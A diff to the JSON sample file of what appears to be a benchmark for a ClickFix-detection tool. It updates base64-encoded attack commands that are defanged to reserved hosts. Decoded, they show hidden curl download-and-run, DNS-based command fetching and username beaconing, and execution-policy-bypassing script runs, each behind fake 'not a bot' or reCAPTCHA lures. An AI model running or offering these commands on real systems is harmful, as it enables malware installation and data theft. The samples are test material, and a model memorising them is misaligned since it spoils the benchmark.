@@ -1,7 +1,7 @@
 {
- "note": "ClickFix First Aid benchmark samples. Every attack sample is defanged: hosts are reserved names (example.invalid) or documentation addresses (203.0.113.0/24), and encoded payloads decode to harmless text. Samples are base64-encoded (UTF-8) because antivirus programs flag readable attack text. None of these samples was part of the project's test suite when the benchmark was first run (6 November 2026).",
+ "note": "ClickFix First Aid benchmark samples. Every attack sample is defanged: hosts are reserved names (example.invalid) or documentation addresses (203.0.113.0/24), and encoded payloads decode to harmless text or to commands that point only at reserved addresses. Samples are base64-encoded (UTF-8) because antivirus programs flag readable attack text. None of these samples was part of the project's test suite when the benchmark was first run (6 November 2026).",
  "kinds": {
-  "V": "command shape as published, with indicators replaced by reserved names",
+  "V": "command as published, with hosts, URLs and encoded payloads replaced by reserved names or harmless text",
   "V+": "published command with a truncated tail completed for this benchmark",
   "R": "reconstructed from a published description; no full command was published"
  },
@@ -106,11 +106,11 @@
   },
   {
    "id": "H09",
-   "name": "headless conhost, curl download, run",
+   "name": "headless conhost, curl download, run, fake \"not a bot\" remark",
    "os": "win",
-   "kind": "V+",
+   "kind": "V",
    "source": "dc",
-   "b64": "Y29uaG9zdC5leGUgLS1oZWFkbGVzcyBjbWQgL2MgY2QgL0QgJXVzZXJwcm9maWxlJSAmJiBjdXJsIC1zIC1vIGEuZXhlIGh0dHA6Ly8yMDMuMC4xMTMuMTg4OjgxMTIvYS5leGUgJiYgc3RhcnQgYS5leGU="
+   "b64": "Y29uaG9zdC5leGUgLS1oZWFkbGVzcyBjbWQgL2MgY2QgL0QgJXVzZXJwcm9maWxlJSAmJiBjdXJsIC1zIC1vIGEuZXhlIGh0dHA6Ly8yMDMuMC4xMTMuMTg4OjgxMTIvYS5leGUgJiYgY29uaG9zdC5leGUgLS1oZWFkbGVzcyBhLmV4ZSAmJiBSRU0gQnkgcHJlc3NpbmcgdGhlIGVudGVyIGJ1dHRvbiB5b3UgY29uZmlybSB5b3UgYXJlIG5vdCBhIGJvdA=="
   },
   {
    "id": "H10",
@@ -178,27 +178,27 @@
   },
   {
    "id": "H18",
-   "name": "DNS variant: nslookup answer run by cmd",
+   "name": "DNS variant: nslookup answer run by hidden PowerShell",
    "os": "win",
-   "kind": "V+",
+   "kind": "V",
    "source": "dc",
-   "b64": "Y21kIC9jICJmb3IgL2YgInRva2Vucz01IiAlYSBpbiAoJ25zbG9va3VwIGV4YW1wbGUuaW52YWxpZCAyMDMuMC4xMTMuMjAgMl4+bnVsIF58IGZpbmQgIk5hbWUiJykgZG8gY21kIC9jICVhIg=="
+   "b64": "Y21kIC9jICJmb3IgL2YgInRva2Vucz01IiAlYSBpbiAoJ25zbG9va3VwIGV4YW1wbGUuaW52YWxpZCAyMDMuMC4xMTMuMjAgMl4+bnVsIF58IGZpbmQgIk5hbWUiJykgZG8gcG93ZXJzaGVsbCAtdyBoaWRkZW4gLWMgIiVhIg=="
   },
   {
    "id": "H19",
    "name": "DNS variant: nslookup beacon with user name",
    "os": "win",
-   "kind": "V+",
+   "kind": "V",
    "source": "dc",
-   "b64": "Y21kIC9jICJuc2xvb2t1cCBmZjEyMyVVU0VSTkFNRSUuZG5zMS5leGFtcGxlLmludmFsaWQgJiYgZWNobyBWZXJpZmljYXRpb24gY29tcGxldGUi"
+   "b64": "Y21kIC9jICJuc2xvb2t1cCBmZjEyMyVVU0VSTkFNRSUuZG5zMS5leGFtcGxlLmludmFsaWQgJiYgZWNobyDinIUg0JLQsNGI0LUg0YPRgdGC0YDQvtC50YHRgtCy0L4g0LTQvtCx0LDQstC70LXQvdC+INCyINC00L7QstC10YDQuNGC0LXQu9GM0L3QvtC1OiA2NTIwIg=="
   },
   {
    "id": "H20",
    "name": "Downloads-folder orchestrator: move, extract, headless run",
    "os": "win",
-   "kind": "R",
+   "kind": "V",
    "source": "thn-pals",
-   "b64": "cG93ZXJzaGVsbCAtQyAiJHQ9JGVudjpUTVA7IE1vdmUtSXRlbSAnJEhPTUVcRG93bmxvYWRzXGRvY184ODEyLnppcCcgJyR0XDg4MTIuemlwJzsgdGFyIC14ZiAnJHRcODgxMi56aXAnIC1DICR0OyBjb25ob3N0IC0taGVhZGxlc3MgcG93ZXJzaGVsbCAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAnJHRccnVuLnBzMSciICMgSSBhbSBub3QgYSByb2JvdCAtIFZlcmlmaWNhdGlvbiBJRDo4ODEy"
+   "b64": "cG93ZXJzaGVsbCAtQyAiJHQ9JGVudjpUTVA7TW92ZS1JdGVtIFwiJEhPTUVcRG93bmxvYWRzXHRtcC56aXBcIiBcIiR0XDc5NDcuemlwXCI7dGFyIC14ZiBcIiR0XDc5NDcuemlwXCIgLUMgXCIkdFwiO2Nvbmhvc3QgLS1oZWFkbGVzcyBwb3dlcnNoZWxsIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlIFwiJHRcdG1wLnBzMVwiICMgXCIqIEkgYW0gbm90IGEgcm9ib3QgcmVDQVBUQ0hBIFZlcmlmaWNhdGlvbiBJRDo3OTQ3ICpcIiI="
   },
   {
    "id": "H21",
